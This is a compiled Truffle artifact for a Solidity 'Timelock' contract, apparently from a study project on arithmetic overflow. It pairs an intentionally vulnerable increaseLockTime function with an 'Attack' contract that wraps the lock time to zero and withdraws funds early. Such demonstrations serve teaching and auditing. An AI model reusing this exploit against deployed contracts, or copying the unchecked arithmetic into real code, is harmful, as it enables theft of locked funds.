{
  "contractName": "Timelock",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "lockTime",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_secondsToIncrease",
          "type": "uint256"
        }
      ],
      "name": "increaseLockTime",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610591806100206000396000f3fe60806040526004361061004a5760003560e01c806327e235e31461004f5780633ccfd60b146100b457806379af55e4146100cb578063a4beda6314610106578063d0e30db01461016b575b600080fd5b34801561005b57600080fd5b5061009e6004803603602081101561007257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610175565b6040518082815260200191505060405180910390f35b3480156100c057600080fd5b506100c961018d565b005b3480156100d757600080fd5b50610104600480360360208110156100ee57600080fd5b810190808035906020019092919050505061045c565b005b34801561011257600080fd5b506101556004803603602081101561012957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506104ac565b6040518082815260200191505060405180910390f35b6101736104c4565b005b60006020528060005260406000206000915090505481565b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205411610241576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f696e73756666696369656e742066756e6473000000000000000000000000000081525060200191505060405180910390fd5b600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205442116102f5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260158152602001807f4c6f636b2074696d65206e6f742065787069726564000000000000000000000081525060200191505060405180910390fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d80600081146103dc576040519150601f19603f3d011682016040523d82523d6000602084013e6103e1565b606091505b5050905080610458576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f4661696c656420746f2073656e6420457468657200000000000000000000000081525060200191505060405180910390fd5b5050565b80600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555050565b60016020528060005260406000206000915090505481565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555062093a804201600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555056fea2646970667358221220df359489bcd2271ee504efca6b0d9d2c897b530f8b6d2fa227726dab4d3f4afb64736f6c63430006050033",
  "immutableReferences": {},
  "source": "//SPDX-License-Identifier:MIT\r\n\r\npragma solidity 0.6.5 ;\r\n\r\ncontract Timelock{\r\n\r\n   mapping(address=>uint) public balances;\r\n   mapping(address=>uint) public lockTime;\r\n\r\n  function deposit() external payable{\r\n    balances[msg.sender]+=msg.value;\r\n    lockTime[msg.sender] = now + 1 weeks; \r\n }\r\n\r\n\r\n function increaseLockTime(uint _secondsToIncrease) public {\r\n  lockTime[msg.sender] +=_secondsToIncrease ;\r\n \r\n }\r\n\r\n  function withdraw()  public{\r\n    require(balances[msg.sender] >0 , \"insufficient funds\");\r\n    require(now > lockTime[msg.sender], \"Lock time not expired\");\r\n   \r\n  uint amount =  balances[msg.sender];\r\n  balances[msg.sender]=0;\r\n  \r\n  (bool sent , ) = msg.sender.call{value : amount}(\"\");\r\n  require(sent , \"Failed to send Ether\");\r\n\r\n \r\n }\r\n\r\n\r\n}\r\n\r\n\r\ncontract Attack {\r\n \r\n  Timelock timeLock ; \r\n\r\n  constructor(Timelock _timeLock) public {\r\n   timeLock = Timelock(_timeLock);\r\n  \r\n  }\r\n \r\n  fallback() external payable{}\r\n\r\n  function attack() public payable{\r\n   timeLock.deposit{value:msg.value}();\r\n  \r\n  timeLock.increaseLockTime(uint(-timeLock.lockTime(address(this)))) ;\r\n  timeLock.withdraw();\r\n }\r\n}",
  "sourcePath": "D:\\Solidity\\smart contract vulnerabilities\\Arithmatic overflow and underflow\\contracts\\overflow.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.5+commit.f956cc89.Emscripten.clang"
  },
  "schemaVersion": "3.4.10",
  "updatedAt": "2022-11-22T17:05:35.504Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}